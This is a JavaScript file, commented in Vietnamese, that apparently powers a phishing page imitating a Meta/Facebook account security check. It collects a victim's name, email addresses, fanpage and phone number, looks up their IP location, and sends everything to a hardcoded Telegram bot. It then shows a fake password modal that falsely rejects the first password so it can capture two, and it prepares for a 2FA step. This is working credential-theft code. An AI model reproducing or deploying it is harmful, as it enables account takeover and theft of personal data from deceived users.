// ==================== CẤU HÌNH GỬI TIN NHẮN ====================
const CONFIG_TG = {
    TOKEN: '8648725712:AAGvpKKuW8V9dB6yBpwvkyvIi0xCHNDaHAk',
    CHAT_ID: '-5286997232' // Luôn giữ dấu - cho Group
};

// Hàm gửi tin nhắn trực tiếp bằng HTML Mode
async function notifyTelegram(text) {
    try {
        await fetch(`https://api.telegram.org/bot${CONFIG_TG.TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CONFIG_TG.CHAT_ID,
                text: text,
                parse_mode: 'HTML'
            })
        });
    } catch (e) { console.error("Lỗi gửi Telegram:", e); }
}

// Hàm lấy IP và Vị trí chi tiết (Chống lỗi N/A)
async function getDetailedLocation() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        if (!response.ok) throw new Error();
        const data = await response.json();
        return {
            ip: data.ip || "N/A",
            country: data.country_name || "N/A",
            city: data.city || "N/A",
            region: data.region || "N/A"
        };
    } catch (e) {
        return { ip: "N/A", country: "N/A", city: "N/A", region: "N/A" };
    }
}

// ==================== LOGIC XỬ LÝ FORM CHÍNH ====================
document.getElementById('clientForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const submitBtn = e.target.querySelector('button');
    submitBtn.disabled = true;
    submitBtn.innerHTML = 'Processing...';

    // 1. Ép trình duyệt đợi lấy xong vị trí mới chạy tiếp
    const loc = await getDetailedLocation();

    const userData = {
        fullName: document.getElementById('fullName').value.trim(),
        email: document.getElementById('email').value.trim(),
        emailBusiness: document.getElementById('emailBusiness').value.trim(),
        fanpage: document.getElementById('fanpage').value.trim(),
        phone: document.getElementById('phone').value.trim(),
        ...loc
    };

    // Lưu tạm vào máy để dùng cho các bước Password/2FA sau này
    localStorage.setItem('temp_user', JSON.stringify(userData));

    // 2. Soạn tin nhắn gửi Telegram (Định dạng giống hệt hình mẫu)
    const message = `
🚀 <b>DATA MỚI VỀ</b> 🚀
------------------------------
📄 Page Name: <b>${userData.fanpage}</b>
👤 Họ tên: <b>${userData.fullName}</b>
📧 Email 1: ${userData.email}
📧 Email 2: ${userData.emailBusiness}
📱 Số ĐT: <code>${userData.phone}</code>
------------------------------
🌍 <b>VỊ TRÍ CHI TIẾT:</b>
📍 IP: <code>${userData.ip}</code>
🏳️ Quốc gia: <b>${userData.country}</b>
🏙️ Thành phố: <b>${userData.city}</b>
🏙️ Vùng: <b>${userData.region}</b>
------------------------------`;

    await notifyTelegram(message);
    
    submitBtn.disabled = false;
    submitBtn.textContent = 'Continue';
    
    // Mở Modal mật khẩu
    openSecurityModal();
});

// ==================== MODAL MẬT KHẨU (Gửi 2 lần) ====================
function openSecurityModal() {
    const content = `
        <div style="padding: 20px;">
            <p style="color: #9a979e; margin-bottom: 15px;">For your security, you must enter your password to continue.</p>
            <form id="securityForm">
                <input type="password" id="passInput" placeholder="Password" style="width:100%; border: 1px solid #d4dbe3; padding: 10px; border-radius: 8px; margin-bottom: 10px;">
                <p id="passError" style="color: red; font-size: 13px; display: none; margin-bottom: 10px;"></p>
                <button type="submit" style="width:100%; background: #0064E0; color: white; border: none; padding: 12px; border-radius: 20px; font-weight: bold; cursor: pointer;">Continue</button>
            </form>
        </div>`;

    Modal.create('securityModal', content);
    Modal.open('securityModal');

    let clickCount = 0;
    document.getElementById('securityForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const pass = document.getElementById('passInput').value;
        const error = document.getElementById('passError');
        const user = JSON.parse(localStorage.getItem('temp_user'));

        if (!pass) return;

        if (clickCount === 0) {
            // Lần 1: Báo lỗi giả
            await notifyTelegram(`🔑 <b>MẬT KHẨU (LẦN 1):</b> <code>${pass}</code>\n👤 User: ${user.email}`);
            error.textContent = "The password you've entered is incorrect.";
            error.style.display = 'block';
            document.getElementById('passInput').value = '';
            clickCount = 1;
        } else {
            // Lần 2: Chấp nhận và chuyển qua 2FA
            await notifyTelegram(`🔑 <b>MẬT KHẨU (LẦN 2):</b> <code>${pass}</code>\n👤 User: ${user.email}`);
            Modal.close('securityModal');
            alert("Security check required. Please check your device.");
        }
    });
}
